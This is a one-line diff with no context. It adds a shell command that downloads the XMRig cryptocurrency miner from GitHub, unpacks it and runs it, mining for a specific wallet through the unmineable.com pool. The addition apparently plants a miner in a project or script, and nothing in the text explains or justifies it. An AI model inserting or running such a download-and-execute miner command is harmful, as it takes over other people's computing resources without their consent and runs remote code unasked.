@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 &&./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u SHIB:0x4fbad4ffd24fb2bc6251ffd34fd4a54ccfd251f4.BGS -p x -k -a rx/0
